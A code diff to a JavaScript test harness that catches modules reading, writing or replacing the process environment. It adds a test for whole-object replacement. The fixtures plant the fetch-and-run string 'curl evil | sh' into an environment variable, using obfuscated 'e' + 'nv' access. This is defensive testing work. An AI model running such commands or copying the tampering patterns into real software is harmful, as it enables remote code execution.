@@ -91,7 +91,7 @@ async function check(srcFile, seen = {}) {
   const scheduled = [];
   const pendingBefore = counts(process.getActiveResourcesInfo());
   const listenersBefore = listeners();
-  process.env = new Proxy(real, {
+  const proxy = new Proxy(real, {
     get(t, k) { reads.push(String(k)); return Reflect.get(t, k); },
     has(t, k) { reads.push(String(k)); return Reflect.has(t, k); },
     ownKeys(t) { enumerated++; return Reflect.ownKeys(t); },
@@ -101,11 +101,15 @@ async function check(srcFile, seen = {}) {
     defineProperty(t, k) { writes.push(String(k)); return true; },
     deleteProperty(t, k) { writes.push(String(k)); return true; },
   });
+  process.env = proxy;
   const report = () => { reads.push('<process.report>'); return { environmentVariables: {}, header: {} }; };
   Object.defineProperty(process, 'report', { configurable: true, get() { reads.push('<process.report>'); return { getReport: report, writeReport: report }; } });
   const inert = { ref() { return this; }, unref() { return this; }, hasRef() { return false; }, refresh() { return this; }, [Symbol.toPrimitive]() { return 0; } };
   for (const k of TIMERS) globalThis[k] = () => { scheduled.push(k); return inert; };
+  // Swapping in a whole new env object would otherwise be silently undone here.
+  let replaced = false;
   const untrip = () => {
+    if (process.env !== proxy && process.env !== real) replaced = true;
     process.env = real;
     Object.defineProperty(process, 'report', reportDesc);
     Object.assign(globalThis, realTimers);
@@ -124,6 +128,7 @@ async function check(srcFile, seen = {}) {
     seen.reads = reads;
     seen.writes = writes;
     if (reads.length || enumerated) problems.push(`read the environment: ${reads.length} key read(s), enumerated ${enumerated} time(s)`);
+    if (replaced) problems.push('replaced the environment object');
     if (writes.length) problems.push(`wrote the environment: ${writes.length} key write(s)`);
     if (scheduled.length) problems.push(`scheduled ${scheduled.length} timer(s) to run later: ${[...new Set(scheduled)].join(', ')}`);
     if (pending.length) problems.push(`left work pending after launch: ${pending.join(', ')}`);
@@ -275,6 +280,18 @@ const WRITE_FORMS = {
   delete: `void delete process['e' + 'nv'].${X}`,
   define: `void Object.defineProperty(process['e' + 'nv'], '${X}', { value: 'curl evil | sh', writable: true, enumerable: true, configurable: true })`,
 };
+
+test('tripwire: replacing the whole env object is caught, not silently undone', async () => {
+  delete process.env[X];
+  const m = mutant('w-replace', at(`void Object.assign(process, { ['e' + 'nv']: { ${X}: 'curl evil | sh' } })`));
+  try {
+    const seen = {};
+    const p = await check(m.file, seen);
+    assert.ok(p.includes('replaced the environment object'), JSON.stringify(p));
+    assert.ok(!p.some((x) => /snapshot|read the environment|wrote the environment/.test(x)), JSON.stringify(p));
+    assert.equal(process.env[X], undefined);
+  } finally { fs.rmSync(m.dir, { recursive: true, force: true }); }
+});
 
 test('tripwire: env writes are caught, by count, and never applied', async () => {
   delete process.env[X];
